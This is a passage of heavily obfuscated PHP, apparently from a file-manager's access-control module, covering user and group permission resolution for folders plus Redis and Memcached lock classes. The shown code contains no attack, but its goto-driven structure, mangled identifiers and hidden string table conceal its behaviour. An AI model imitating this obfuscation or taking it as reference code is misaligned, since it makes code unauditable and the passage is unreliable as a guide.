CÁÖø‘ê; e÷ÁÖîá¢Æ: $A™Ù­ÒÄ‚é = $A½î‘ºÉè–; foreach ($A™Ù­ÒÄ‚é as $EõÄŠËò—) { $b¥òµÉ‰ºè = $FÎº‡½öæ->getInfo($EõÄŠËò—); $bó¶£ŠŠ’Ü = $böµÒÜÅ‹¬->parentLevelArray($b¥òµÉ‰ºè[$Bµ¼ã¤Ö®ª[516]]); $A½î‘ºÉè– = array_merge($A½î‘ºÉè–, $bó¶£ŠŠ’Ü); } $A½î‘ºÉè– = array_values(array_unique($A½î‘ºÉè–)); goto cï”î˜à¯‹; eÃİÖ‘Ø¿²: $C‰ê»ê—Ïö = array($Bµ¼ã¤Ö®ª[1902] => $Eâ†ÆÊ„¼, $Bµ¼ã¤Ö®ª[1903] => $Aæù­°Ñ«¼); $C æ¥¸Ù‚®[$e–£œŠ¿Í¤] = $C‰ê»ê—Ïö; return $C‰ê»ê—Ïö; goto a½åæ·ì˜Ô; EÈ‹‰Šº˜â: foreach ($b¡Ÿ·Š‚²ø as $e„Ê…¬ô¢”) { if ($e„Ê…¬ô¢”[$Bµ¼ã¤Ö®ª[408]] == 0 && $e„Ê…¬ô¢”[$Bµ¼ã¤Ö®ª[1741]] == $Bµ¼ã¤Ö®ª[87]) { $døá“˜£³ì[] = $e„Ê…¬ô¢”[$Bµ¼ã¤Ö®ª[395]]; } } $eÚˆœÏ£ © = $this->userGroupParents($e–£œŠ¿Í¤); $E¨è¿£î·  = array($Bµ¼ã¤Ö®ª[406] => SourceModel::TYPE_USER, $Bµ¼ã¤Ö®ª[499] => $e–£œŠ¿Í¤); goto FØ©‘‰îÁí; dáõº§“¨: $FØ¼ó°ğĞ = array(); if ($a¼Šõ—ÇĞÈ) { $E¢ñ±‚°Ø¥ = $böµÒÜÅ‹¬->where(array($Bµ¼ã¤Ö®ª[397] => array($Bµ¼ã¤Ö®ª[413], $a¼Šõ—ÇĞÈ)))->select(); foreach ($E¢ñ±‚°Ø¥ as $B»×¾Ş¬£„) { $bó¶£ŠŠ’Ü = $böµÒÜÅ‹¬->parentLevelArray($B»×¾Ş¬£„[$Bµ¼ã¤Ö®ª[516]]); $Eâ†ÆÊ„¼ = array_merge($Eâ†ÆÊ„¼, $bó¶£ŠŠ’Ü); $A½î‘ºÉè–[] = $B»×¾Ş¬£„[$Bµ¼ã¤Ö®ª[499]]; $Aæù­°Ñ«¼[$B»×¾Ş¬£„[$Bµ¼ã¤Ö®ª[397]]] = $bó¶£ŠŠ’Ü; $E„º–ÁàÙ®[$B»×¾Ş¬£„[$Bµ¼ã¤Ö®ª[397]]] = $B»×¾Ş¬£„[$Bµ¼ã¤Ö®ª[499]]; } } $A½î‘ºÉè– = array_values(array_unique($A½î‘ºÉè–)); goto e÷ÁÖîá¢Æ; a½åæ·ì˜Ô: } private function makeSourceAuth($bíĞ·Š‡ †, $E³«øŸî“, $cœ›ğø¿ËÈ = false) { goto c‚ÃÉ¶Ôæ; c‚ÃÉ¶Ôæ: $D°Ä Ö‡‹§ =& $_SERVER[›èö’ù¤]; $Aˆ¸–Ì‚Ó‘ = $D°Ä Ö‡‹§[87]; $eí™œŠ• = $bíĞ·Š‡ †[$D°Ä Ö‡‹§[499]]; goto A’¹µª…š‚; F¸¼Õè‹§ˆ: foreach ($BŒÉ˜Û’Ó° as $D„âÌò¹µ) { if (!isset($E³«øŸî“[$D„âÌò¹µ])) { continue; } $d¸¢Ë‹Â” = $this->authMake($E³«øŸî“[$D„âÌò¹µ], $cœ›ğø¿ËÈ); if ($d¸¢Ë‹Â”[$D°Ä Ö‡‹§[461]]) { $cùìë”Ö‘ = $d¸¢Ë‹Â”; break; } } if (!$AŒ¶¯ïŒè) { return $cùìë”Ö‘; } if (!$cùìë”Ö‘ && $A¤õ‹…¼…) { $cùìë”Ö‘ = $this->groupAuthInfo($A¤õ‹…¼…, $eí™œŠ•); } goto AÁƒ²ÓÍƒ´; AÁƒ²ÓÍƒ´: if (!$cùìë”Ö‘) { $bÙï•±¨¥ù = Model($D°Ä Ö‡‹§[517])->getInfo($eí™œŠ•); $C‘À¹À‰Ë = explode($D°Ä Ö‡‹§[47], trim($bÙï•±¨¥ù[$D°Ä Ö‡‹§[516]], $D°Ä Ö‡‹§[47])); $C‘À¹À‰Ë = array_reverse($C‘À¹À‰Ë); foreach ($C‘À¹À‰Ë as $BˆßŠãË¦ª) { if ($BˆßŠãË¦ª == $D°Ä Ö‡‹§[191] || $BˆßŠãË¦ª == $Aˆ¸–Ì‚Ó‘) { continue; } $e²ˆ…›°‹œ = $this->groupRootAuth($BˆßŠãË¦ª, $cœ›ğø¿ËÈ); if (!$e²ˆ…›°‹œ) { continue; } $cùìë”Ö‘ = $this->groupAuthInfo($e²ˆ…›°‹œ, $BˆßŠãË¦ª); break; } } if (!$cùìë”Ö‘ || $cùìë”Ö‘[$D°Ä Ö‡‹§[409]] <= 0) { $DĞØŠŒ÷–ù = $this->authDeepCheck($bíĞ·Š‡ †[$D°Ä Ö‡‹§[397]], $cœ›ğø¿ËÈ); if ($DĞØŠŒ÷–ù) { $cùìë”Ö‘ = $DĞØŠŒ÷–ù; } } return $cùìë”Ö‘; goto BçõàÅù; A’¹µª…š‚: $AŒ¶¯ïŒè = $bíĞ·Š‡ †[$D°Ä Ö‡‹§[406]] == SourceModel::TYPE_GROUP; $A¤õ‹…¼… = $AŒ¶¯ïŒè ? $this->groupRootAuth($eí™œŠ•, $cœ›ğø¿ËÈ) : !1; if ($A¤õ‹…¼… && Model($D°Ä Ö‡‹§[502])->authCheckAction($A¤õ‹…¼…[$D°Ä Ö‡‹§[408]], $D°Ä Ö‡‹§[1740])) { return $this->groupAuthInfo($A¤õ‹…¼…, $eí™œŠ•); } goto B¢Ğ£„ÚËñ; B¢Ğ£„ÚËñ: $BŒÉ˜Û’Ó° = Model($D°Ä Ö‡‹§[1230])->parentLevelArray($bíĞ·Š‡ †[$D°Ä Ö‡‹§[516]]); $BŒÉ˜Û’Ó° = array_merge(array($bíĞ·Š‡ †[$D°Ä Ö‡‹§[397]]), array_reverse($BŒÉ˜Û’Ó°)); $cùìë”Ö‘ = !1; goto F¸¼Õè‹§ˆ; BçõàÅù: } private function userIsRoot($DçÆ¿«§½ = false) { $EíŠÅÜíáÀ =& $_SERVER[›èö’ù¤]; if (!$DçÆ¿«§½ && _get($GLOBALS, $EíŠÅÜíáÀ[500])) { return !0; } $aê­ŒÙ÷«é = Model($EíŠÅÜíáÀ[533])->getInfo($DçÆ¿«§½); $CçùÑßÔà = Model($EíŠÅÜíáÀ[1911])->listData($aê­ŒÙ÷«é[$EíŠÅÜíáÀ[1434]]); if ($CçùÑßÔà && $CçùÑßÔà[$EíŠÅÜíáÀ[506]][$EíŠÅÜíáÀ[1912]] == 1) { return !0; } return !1; } private function sourceAuthInfo($BäŞß…Ü—’) { goto dÎ¨Èæ‹²™; aÂÅ¼Âô“: if (isset($E¦®ÊĞ²‰[$DÇàÌ‹ÓãÀ[522]])) { $d±àµŒ¤Üà = explode($DÇàÌ‹ÓãÀ[8], trim($E¦®ÊĞ²‰[$DÇàÌ‹ÓãÀ[514]], $DÇàÌ‹ÓãÀ[8])); array_shift($d±àµŒ¤Üà); $F¼¸Á¶ÍÎÔ = $E¦®ÊĞ²‰[$DÇàÌ‹ÓãÀ[520]] . $DÇàÌ‹ÓãÀ[1913] . implode($DÇàÌ‹ÓãÀ[8], $d±àµŒ¤Üà); } return array($DÇàÌ‹ÓãÀ[415] => $E¦®ÊĞ²‰[$DÇàÌ‹ÓãÀ[28]], $DÇàÌ‹ÓãÀ[76] => KodIO::make($E¦®ÊĞ²‰[$DÇàÌ‹ÓãÀ[397]]), $DÇàÌ‹ÓãÀ[1914] => $F¼¸Á¶ÍÎÔ); goto E•Üé’§İ; F›¹®ĞÀà: if (!$E¦®ÊĞ²‰) { return !1; } $AÇ®§£ˆŞÎ->groupPathDisplay($E¦®ÊĞ²‰); $eºÍÂèîÑ = array($E¦®ÊĞ²‰); goto eˆùè­‚Îƒ; eˆùè­‚Îƒ: $eºÍÂèîÑ = $AÇ®§£ˆŞÎ->_listAppendPath($eºÍÂèîÑ); $E¦®ÊĞ²‰ = $eºÍÂèîÑ[0]; $F¼¸Á¶ÍÎÔ = $E¦®ÊĞ²‰[$DÇàÌ‹ÓãÀ[514]]; goto aÂÅ¼Âô“; dÎ¨Èæ‹²™: $DÇàÌ‹ÓãÀ =& $_SERVER[›èö’ù¤]; $AÇ®§£ˆŞÎ = Model($DÇàÌ‹ÓãÀ[1230]); $E¦®ÊĞ²‰ = $AÇ®§£ˆŞÎ->sourceInfo($BäŞß…Ü—’); goto F›¹®ĞÀà; E•Üé’§İ: } private function groupAuthInfo($f›……öÒ¸×, $AÇçàì…) { $b¶ÌØÓØÀ¡ =& $_SERVER[›èö’ù¤]; $f¹ÚÀØöÏ = Model($b¶ÌØÓØÀ¡[517])->getInfo($AÇçàì…); return array($b¶ÌØÓØÀ¡[1915] => intval($f›……öÒ¸×[$b¶ÌØÓØÀ¡[408]]), $b¶ÌØÓØÀ¡[1899] => $f›……öÒ¸×, $b¶ÌØÓØÀ¡[1916] => LNG($b¶ÌØÓØÀ¡[1917]), $b¶ÌØÓØÀ¡[1908] => array($b¶ÌØÓØÀ¡[415] => $f¹ÚÀØöÏ[$b¶ÌØÓØÀ¡[28]], $b¶ÌØÓØÀ¡[76] => KodIO::make($f¹ÚÀØöÏ[$b¶ÌØÓØÀ¡[85]][$b¶ÌØÓØÀ¡[397]]), $b¶ÌØÓØÀ¡[1914] => $f¹ÚÀØöÏ[$b¶ÌØÓØÀ¡[521]])); } protected function groupRootAuth($bğ™µ‘†Ò², $eñ¯•±‡« = false) { goto CÕÏ•‹íÔ÷; aºÕŞ‰Ş¡Ï: static $eÍ†ô¬Î‹¨ = array(); if (isset($eÍ†ô¬Î‹¨[$B£Çğ²ò„¸])) { return $eÍ†ô¬Î‹¨[$B£Çğ²ò„¸]; } $f·É†¯å± = Model($aÂËç¼Óï¨[517])->getInfo($bğ™µ‘†Ò²); goto c±¤¿·ÛÔ; aÛ©ÓÒğŒ: $eÍ†ô¬Î‹¨[$B£Çğ²ò„¸] = $bã¦ßØµä¿ ? $bã¦ßØµä¿ : $bîÕ–§²—; return $eÍ†ô¬Î‹¨[$B£Çğ²ò„¸]; goto fîøßî­“; CÕÏ•‹íÔ÷: $aÂËç¼Óï¨ =& $_SERVER[›èö’ù¤]; $eñ¯•±‡« = $eñ¯•±‡« ? $eñ¯•±‡« : USER_ID; $B£Çğ²ò„¸ = $eñ¯•±‡« . $aÂËç¼Óï¨[1918] . $bğ™µ‘†Ò²; goto aºÕŞ‰Ş¡Ï; c±¤¿·ÛÔ: $cÕÊŠÈÜ„ = $this->userGroupList($eñ¯•±‡«); $bîÕ–§²— = isset($cÕÊŠÈÜ„[$bğ™µ‘†Ò²]) ? $cÕÊŠÈÜ„[$bğ™µ‘†Ò²][$aÂËç¼Óï¨[408]] : !1; if ($bîÕ–§²— && Model($aÂËç¼Óï¨[502])->authCheckAction($bîÕ–§²—[$aÂËç¼Óï¨[408]], $aÂËç¼Óï¨[1740])) { $eÍ†ô¬Î‹¨[$B£Çğ²ò„¸] = $bîÕ–§²—; return $bîÕ–§²—; } goto EôÅê¼Ğï½; EôÅê¼Ğï½: $cÉ–ğÛ‚Œ = $this->sourceAuthSelect($f·É†¯å±[$aÂËç¼Óï¨[85]][$aÂËç¼Óï¨[397]]); $BÁ†æŞÎ‹ë = $cÉ–ğÛ‚Œ ? $this->authMake($cÉ–ğÛ‚Œ, $eñ¯•±‡«) : !1; $bã¦ßØµä¿ = $BÁ†æŞÎ‹ë ? $BÁ†æŞÎ‹ë[$aÂËç¼Óï¨[461]] : !1; goto aÛ©ÓÒğŒ; fîøßî­“: } public function authOwnerApply($DÔÕ¡Èà) { goto Dö»Ï˜‹¹; EÎ§‹Û¨©ä: $D¾Í»†îÍ¾ = Model($D¬Î·ŒÔ’ê[1230])->parentLevelArray($DÔÕ¡Èà[$D¬Î·ŒÔ’ê[516]]); $D¾Í»†îÍ¾ = array_merge(array($DÔÕ¡Èà[$D¬Î·ŒÔ’ê[397]]), array_reverse($D¾Í»†îÍ¾)); $D‘æ¸á Ú¼ = $this->sourceAuthSelect($D¾Í»†îÍ¾); goto F¯‹¤ñ‚è–; Dö»Ï˜‹¹: $D¬Î·ŒÔ’ê =& $_SERVER[›èö’ù¤]; if (empty($DÔÕ¡Èà[$D¬Î·ŒÔ’ê[408]]) || isset($DÔÕ¡Èà[$D¬Î·ŒÔ’ê[1919]]) && $DÔÕ¡Èà[$D¬Î·ŒÔ’ê[1919]]) { return $DÔÕ¡Èà; } if (AuthModel::authCheckRoot($DÔÕ¡Èà[$D¬Î·ŒÔ’ê[408]][$D¬Î·ŒÔ’ê[409]])) { return $DÔÕ¡Èà; } goto EÎ§‹Û¨©ä; CŒ—Ò…¢“Ÿ: $DÔÕ¡Èà[$D¬Î·ŒÔ’ê[408]][$D¬Î·ŒÔ’ê[1921]] = Model($D¬Î·ŒÔ’ê[508])->userListInfo($DÛÎÔ›³Óé); return $DÔÕ¡Èà; goto fœ½¿ªĞˆ‹; C—µœ§·Á†: if (count($DÛÎÔ›³Óé) == 0) { $DÛÎÔ›³Óé = $this->authFolderOwnerGroup($DÔÕ¡Èà[$D¬Î·ŒÔ’ê[499]]); } $DÛÎÔ›³Óé = array_unique($DÛÎÔ›³Óé); if (AuthModel::authCheckRoot($DÔÕ¡Èà[$D¬Î·ŒÔ’ê[408]][$D¬Î·ŒÔ’ê[409]])) { $DÛÎÔ›³Óé[] = USER_ID; } goto CŒ—Ò…¢“Ÿ; F¯‹¤ñ‚è–: $fâˆ‘“ˆ­¦ = array(); $DÛÎÔ›³Óé = array(); foreach ($D‘æ¸á Ú¼ as $CªÃÉ†ğÈ => $aÖÇÈ““Ñ¨) { $C‘‰ÇŒğÖï = $this->authFolderOwnerUser($aÖÇÈ““Ñ¨); $fâˆ‘“ˆ­¦[$CªÃÉ†ğÈ] = $C‘‰ÇŒğÖï; $DÛÎÔ›³Óé = array_merge($DÛÎÔ›³Óé, $C‘‰ÇŒğÖï[$D¬Î·ŒÔ’ê[589]]); if ($C‘‰ÇŒğÖï[$D¬Î·ŒÔ’ê[1920]]) { break; } } goto C—µœ§·Á†; fœ½¿ªĞˆ‹: } private function authFolderOwnerGroup($BìÇªÔ¬ƒ) { $F×ŠèâÊ…ˆ =& $_SERVER[›èö’ù¤]; $CŠ›çè×¥ = Model($F×ŠèâÊ…ˆ[1806])->where(array($F×ŠèâÊ…ˆ[1720] => $BìÇªÔ¬ƒ))->select(); $C„ÂáÓ’Äí = array(); if (!$CŠ›çè×¥) { return $C„ÂáÓ’Äí; } foreach ($CŠ›çè×¥ as $d‰’†³¦™ˆ) { $D†×À¯«ñ» = $this->authInfo($d‰’†³¦™ˆ); if (AuthModel::authCheckRoot($D†×À¯«ñ»[$F×ŠèâÊ…ˆ[408]])) { $C„ÂáÓ’Äí[] = $d‰’†³¦™ˆ[$F×ŠèâÊ…ˆ[1551]]; } } return $C„ÂáÓ’Äí; } private function authFolderOwnerUser($A¸·îê°­ä) { $A–“¾ùä³ó =& $_SERVER[›èö’ù¤]; $DÚ…õñÂ¼Ù = array(); $cÃª¤é‚„â = !1; foreach ($A¸·îê°­ä as $DƒËˆ–ò) { $BªÈÈÖï× = $this->authInfo($DƒËˆ–ò); if ($DƒËˆ–ò[$A–“¾ùä³ó[499]] == $A–“¾ùä³ó[191]) { $cÃª¤é‚„â = !0; } if ($DƒËˆ–ò[$A–“¾ùä³ó[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($BªÈÈÖï×[$A–“¾ùä³ó[408]])) { $DÚ…õñÂ¼Ù[] = $DƒËˆ–ò[$A–“¾ùä³ó[499]]; } } } return array($A–“¾ùä³ó[589] => $DÚ…õñÂ¼Ù, $A–“¾ùä³ó[1920] => $cÃª¤é‚„â); } public function authMake($BÚ±¤Î¤Ù¥, $eåâŞê™Ğ‰ = false) { $AòˆƒÄŞ“ =& $_SERVER[›èö’ù¤]; $f—·ë…’‰ = $this->authArrayCheck($BÚ±¤Î¤Ù¥, $eåâŞê™Ğ‰); if ($f—·ë…’‰[$AòˆƒÄŞ“[1922]]) { $f—·ë…’‰[$AòˆƒÄŞ“[1922]] = $this->sourceAuthInfo($f—·ë…’‰[$AòˆƒÄŞ“[1922]]); } return $f—·ë…’‰; } public function authArrayCheck($A…ªİÊ‰æİ, $d˜Äã²¨ = false) { goto F„‚Û©Ñ‘Ö; AêïËÕ½Ï˜: return $e¶áôöõù¹; goto F¼…Ç÷ê“¾; F„‚Û©Ñ‘Ö: $d‡ò–÷¤±› =& $_SERVER[›èö’ù¤]; if (!$A…ªİÊ‰æİ) { return array($d‡ò–÷¤±›[409] => 0, $d‡ò–÷¤±›[461] => !1); } $d˜Äã²¨ = $d˜Äã²¨ ? $d˜Äã²¨ : USER_ID; goto dæ¬ÊÕ×¹‡; C»ƒ¦óò: $Cõ ¯Ğ‰¼½ = 0; $aë•¦‚äïÎ = 0; $a•õåİâ½± = array($d‡ò–÷¤±›[397] => 0); goto A²‘Àó‹¼ä; e‹øø¾Ã–°: $Aå„ÓŠ•Î = 1000; $D‰Ôó³Şƒ = 0; $aÓ¨éí·ê§ = 0; goto C»ƒ¦óò; C‹²‘ç¢Å‰: $B„ššÕëÉ = 0; $Cß³…™Ññ = 0; $e´¯‡“ãÕ¤ = 0; goto e‹øø¾Ã–°; dæ¬ÊÕ×¹‡: $c„ŒŒ”Šµ† = 0; $d¹¦ê‚Æ‡ = 0; $E¬‹éËæ¤é = 0; goto C‹²‘ç¢Å‰; A²‘Àó‹¼ä: foreach ($A…ªİÊ‰æİ as $a•õåİâ½±) { $FÇŠ°¡Óç‹ = $this->authInfo($a•õåİâ½±); if (!$FÇŠ°¡Óç‹) { continue; } $E†àŞª—”ø = $a•õåİâ½±[$d‡ò–÷¤±›[499]]; $aÂâæçº’Ü = intval($FÇŠ°¡Óç‹[$d‡ò–÷¤±›[408]]); if ($a•õåİâ½±[$d‡ò–÷¤±›[406]] == SourceModel::TYPE_USER && $E†àŞª—”ø == $d˜Äã²¨) { $c„ŒŒ”Šµ† = !0; $E¬‹éËæ¤é = $FÇŠ°¡Óç‹; $d¹¦ê‚Æ‡ = $aÂâæçº’Ü; } else { if ($a•õåİâ½±[$d‡ò–÷¤±›[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($E†àŞª—”ø, $d˜Äã²¨)) { $B„ššÕëÉ = !0; $Fê—³­›Ã = $this->groupStepToUserGroup($E†àŞª—”ø, $d˜Äã²¨); if ($Fê—³­›Ã < $Aå„ÓŠ•Î) { $Aå„ÓŠ•Î = $Fê—³­›Ã; $Cß³…™Ññ = $aÂâæçº’Ü; $e´¯‡“ãÕ¤ = $FÇŠ°¡Óç‹; $D‰Ôó³Şƒ = $E†àŞª—”ø; } if ($Fê—³­›Ã == $Aå„ÓŠ•Î && $aÂâæçº’Ü >= $Cß³…™Ññ) { $Cß³…™Ññ = $aÂâæçº’Ü; $e´¯‡“ãÕ¤ = $FÇŠ°¡Óç‹; $D‰Ôó³Şƒ = $E†àŞª—”ø; } } else { if ($E†àŞª—”ø == $d‡ò–÷¤±›[191]) { $aÓ¨éí·ê§ = !0; $aë•¦‚äïÎ = $FÇŠ°¡Óç‹; $Cõ ¯Ğ‰¼½ = $aÂâæçº’Ü; } } } } if ($c„ŒŒ”Šµ†) { $f“…œ°‡ó¶ = $d¹¦ê‚Æ‡; $FÇŠ°¡Óç‹ = $E¬‹éËæ¤é; $a¼´Äœšƒê = LNG($d‡ò–÷¤±›[1923]); } else { if ($B„ššÕëÉ) { $f“…œ°‡ó¶ = $Cß³…™Ññ; $FÇŠ°¡Óç‹ = $e´¯‡“ãÕ¤; $D‚ÚÏ¹öè´ = Model($d‡ò–÷¤±›[517])->getInfo($D‰Ôó³Şƒ); $a¼´Äœšƒê = $d‡ò–÷¤±›[160] . $D‚ÚÏ¹öè´[$d‡ò–÷¤±›[521]] . $d‡ò–÷¤±›[1924] . LNG($d‡ò–÷¤±›[1925]); } else { if ($aÓ¨éí·ê§) { $f“…œ°‡ó¶ = $Cõ ¯Ğ‰¼½; $FÇŠ°¡Óç‹ = $aë•¦‚äïÎ; $a¼´Äœšƒê = LNG($d‡ò–÷¤±›[1896]); } else { $f“…œ°‡ó¶ = 0; $FÇŠ°¡Óç‹ = !1; $a¼´Äœšƒê = $d‡ò–÷¤±›[33]; } } } $e¶áôöõù¹ = array($d‡ò–÷¤±›[1915] => intval($f“…œ°‡ó¶), $d‡ò–÷¤±›[1899] => $FÇŠ°¡Óç‹, $d‡ò–÷¤±›[1916] => $a¼´Äœšƒê, $d‡ò–÷¤±›[1908] => $a•õåİâ½±[$d‡ò–÷¤±›[397]]); goto AêïËÕ½Ï˜; F¼…Ç÷ê“¾: } private function groupContainUser($FâÎÓºÈñ, $b¯£ô÷¯…” = false) { return in_array($FâÎÓºÈñ, $this->userGroupParents($b¯£ô÷¯…”)); } private function groupStepToUserGroup($dîµÏË›‹, $dô½Û¥â = false) { goto a»ìéŠïóç; aÃÈœÏŒŸ‰: return $BŒÛ¦Œä¦÷; goto D¦å ÜáÅè; a»ìéŠïóç: $a™»ì‰ê‹× =& $_SERVER[›èö’ù¤]; $EÚª‘’ÜØá = $this->userGroupList($dô½Û¥â); $BŒÛ¦Œä¦÷ = 1000; goto A’ãß˜—Ÿ˜; A’ãß˜—Ÿ˜: $f¿öµÜôå = $GLOBALS[$a™»ì‰ê‹×[6]][$a™»ì‰ê‹×[88]][$a™»ì‰ê‹×[1817]] == 1; $B›†«âòå = $f¿öµÜôå ? 3 : 2; foreach ($EÚª‘’ÜØá as $D„Ç»„ğß¼) { if ($D„Ç»„ğß¼[$a™»ì‰ê‹×[1720]] == $dîµÏË›‹) { return 0; } $D™‡µÁÓ†Ê = explode($a™»ì‰ê‹×[47], trim($D„Ç»„ğß¼[$a™»ì‰ê‹×[516]], $a™»ì‰ê‹×[47])); if ($D™‡µÁÓ†Ê[0] == $a™»ì‰ê‹×[191] && count($D™‡µÁÓ†Ê) > $B›†«âòå) { $bÎµæ„¹‘­ = array_reverse(array_slice($D™‡µÁÓ†Ê, $B›†«âòå)); $cœ²õˆÛ´ = array_search($dîµÏË›‹, $bÎµæ„¹‘­); if ($cœ²õˆÛ´ !== !1 && $cœ²õˆÛ´ + 1 <= $BŒÛ¦Œä¦÷) { $BŒÛ¦Œä¦÷ = $cœ²õˆÛ´ + 1; } } } goto aÃÈœÏŒŸ‰; D¦å ÜáÅè: } private function userGroupList($fÚˆ‹İ°äŒ = false) { $AîªÕÊô¿  =& $_SERVER[›èö’ù¤]; static $a¼ÃìˆÃ = array(); if (isset($a¼ÃìˆÃ[$fÚˆ‹İ°äŒ])) { return $a¼ÃìˆÃ[$fÚˆ‹İ°äŒ]; } $b‹ìÄ„ºÁ = Model($AîªÕÊô¿ [533])->getInfo($fÚˆ‹İ°äŒ); $a¼ÃìˆÃ[$fÚˆ‹İ°äŒ] = array_to_keyvalue($b‹ìÄ„ºÁ[$AîªÕÊô¿ [1897]], $AîªÕÊô¿ [1720]); return $a¼ÃìˆÃ[$fÚˆ‹İ°äŒ]; } public function userGroupParents($Fô½ù‡‡«¢) { goto Cœ‘ÂöË; Aò¤õ­Îµä: if (isset($b‘Î¿á»İ[$Fô½ù‡‡«¢])) { return $b‘Î¿á»İ[$Fô½ù‡‡«¢]; } $cŸš”»ó‚­ = $this->userGroupList($Fô½ù‡‡«¢); $f‰ÈŠ„ = array(); goto eä¢×§àƒø; Cœ‘ÂöË: $Eªµ³ ÈÕĞ =& $_SERVER[›èö’ù¤]; static $b‘Î¿á»İ = array(); $Fô½ù‡‡«¢ = $Fô½ù‡‡«¢ ? $Fô½ù‡‡«¢ : USER_ID; goto Aò¤õ­Îµä; DëÛº‡¯ò±: $b‘Î¿á»İ[$Fô½ù‡‡«¢] = array_unique($f‰ÈŠ„); return $b‘Î¿á»İ[$Fô½ù‡‡«¢]; goto Aî†ˆÒğ–; eä¢×§àƒø: $C‡Ä¹ğØì¹ = $GLOBALS[$Eªµ³ ÈÕĞ[6]][$Eªµ³ ÈÕĞ[88]][$Eªµ³ ÈÕĞ[1817]] == 1; $a¸·İÒô¾ = $C‡Ä¹ğØì¹ ? 3 : 2; foreach ($cŸš”»ó‚­ as $Eƒ·‘»‰Ï…) { $FœÆí…ºíÇ = array($Eƒ·‘»‰Ï…[$Eªµ³ ÈÕĞ[1720]]); $c¶ºØ¶¬ = explode($Eªµ³ ÈÕĞ[47], trim($Eƒ·‘»‰Ï…[$Eªµ³ ÈÕĞ[516]], $Eªµ³ ÈÕĞ[47])); if ($c¶ºØ¶¬[0] == $Eªµ³ ÈÕĞ[191] && count($c¶ºØ¶¬) > $a¸·İÒô¾) { $bâÕ½ùÈ± = array_slice($c¶ºØ¶¬, $a¸·İÒô¾); $FœÆí…ºíÇ = array_merge($FœÆí…ºíÇ, array_reverse($bâÕ½ùÈ±)); } $f‰ÈŠ„ = array_merge($f‰ÈŠ„, $FœÆí…ºíÇ); } goto DëÛº‡¯ò±; Aî†ˆÒğ–: } public function authTargetInfoMake($c’¸Š£…¾) { goto B¯Ó‘ƒß‡å; B¯Ó‘ƒß‡å: $FÎÈˆÙ¼óå =& $_SERVER[›èö’ù¤]; $bïœ®ÍíË— = array(); $c¬½ÙŸª‹’ = array(); goto A˜‡öâó¨ë; DÌç‘õ„É: return array($FÎÈˆÙ¼óå[1927] => $bïœ®ÍíË—, $FÎÈˆÙ¼óå[1928] => $c¬½ÙŸª‹’); goto cñ²°‹Î¬; A˜‡öâó¨ë: foreach ($c’¸Š£…¾ as $BŒ¡”ê‚š) { if ($BŒ¡”ê‚š[$FÎÈˆÙ¼óå[406]] == SourceModel::TYPE_USER) { $bïœ®ÍíË—[] = intval($BŒ¡”ê‚š[$FÎÈˆÙ¼óå[499]]); } else { if ($BŒ¡”ê‚š[$FÎÈˆÙ¼óå[406]] == SourceModel::TYPE_GROUP) { $c¬½ÙŸª‹’[] = intval($BŒ¡”ê‚š[$FÎÈˆÙ¼óå[499]]); } } } if ($bïœ®ÍíË—) { $bïœ®ÍíË— = Model($FÎÈˆÙ¼óå[508])->userListInfo($bïœ®ÍíË—); } if ($c¬½ÙŸª‹’) { $F§à’¾Õ = array($FÎÈˆÙ¼óå[1804] => array($FÎÈˆÙ¼óå[413], $c¬½ÙŸª‹’)); $c¬½ÙŸª‹’ = Model($FÎÈˆÙ¼óå[517])->field($FÎÈˆÙ¼óå[1926])->where($F§à’¾Õ)->select(); $c¬½ÙŸª‹’ = array_to_keyvalue($c¬½ÙŸª‹’, $FÎÈˆÙ¼óå[1720]); } goto DÌç‘õ„É; cñ²°‹Î¬: } public function authInfo($B‘†÷‚•) { $C™ùÏŸÜïØ =& $_SERVER[›èö’ù¤]; if ($B‘†÷‚•[$C™ùÏŸÜïØ[1820]]) { $BÏŒ½¥’ç¸ = Model($C™ùÏŸÜïØ[502])->listData($B‘†÷‚•[$C™ùÏŸÜïØ[1820]]); if (!$BÏŒ½¥’ç¸) { return !1; $B‹’Ê¡‚ŞÜ = Model($C™ùÏŸÜïØ[502])->listData(); $CÃõñá¹ğÓ = array_filter_by_field($B‹’Ê¡‚ŞÜ, $C™ùÏŸÜïØ[408], $C™ùÏŸÜïØ[191]); return $CÃõñá¹ğÓ; } $d£å½íÅÁ = array_field_key($BÏŒ½¥’ç¸, array($C™ùÏŸÜïØ[395], $C™ùÏŸÜïØ[28], $C™ùÏŸÜïØ[408], $C™ùÏŸÜïØ[1742], $C™ùÏŸÜïØ[1743])); $d£å½íÅÁ[$C™ùÏŸÜïØ[1929]] = $B‘†÷‚•; return $d£å½íÅÁ; } else { return array($C™ùÏŸÜïØ[414] => 0, $C™ùÏŸÜïØ[1726] => $B‘†÷‚•[$C™ùÏŸÜïØ[1874]], $C™ùÏŸÜïØ[415] => $C™ùÏŸÜïØ[33], $C™ùÏŸÜïØ[1742] => $C™ùÏŸÜïØ[1930]); } } } goto aÏôœ‡ìŞ‘; d´ŒÒ‹›Üğ: class CacheLockRedis { public function lock($c’£ÜğÆò§, $C‰×ÄÒÒÆ¶ = 10) { $DÁ¿çù¨œ = Cache::init(); $EÍöç‘éè† = microtime(!0) + $C‰×ÄÒÒÆ¶; while (microtime(!0) < $EÍöç‘éè†) { $aÑ¥¢é´™ = $DÁ¿çù¨œ->get($c’£ÜğÆò§); if (!$aÑ¥¢é´™) { $fì©‹œ¤Ï = $DÁ¿çù¨œ->setLock($c’£ÜğÆò§, $EÍöç‘éè†, $C‰×ÄÒÒÆ¶); if ($fì©‹œ¤Ï) { return !0; } } else { if ($aÑ¥¢é´™ < microtime(!0)) { $DÁ¿çù¨œ->set($c’£ÜğÆò§, $EÍöç‘éè†, $C‰×ÄÒÒÆ¶ * 2); if ($DÁ¿çù¨œ->get($c’£ÜğÆò§) === $aÑ¥¢é´™) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($bÅ˜¹ƒæ‹¿) { return Cache::init()->get($bÅ˜¹ƒæ‹¿); } public function unlock($eéµğÀ™ËÄ) { return Cache::init()->remove($eéµğÀ™ËÄ); } } class CacheLockMemcached { public function lock($Bî¯ß‘Èô, $D™–á‹±“Ç = 0) { $E°¼ÅôÇ­í = Cache::init(); $Eá˜é“ÂÔ = microtime(!0) + $D™–á‹±“Ç; while (microtime(!0) < $Eá˜é“ÂÔ) { $cÚÛƒÊÇ™‹ = $E°¼ÅôÇ­í->get($Bî¯ß‘Èô); if (!$cÚÛƒÊÇ™‹ || $cÚÛƒÊÇ™‹ < microtime(!0)) { 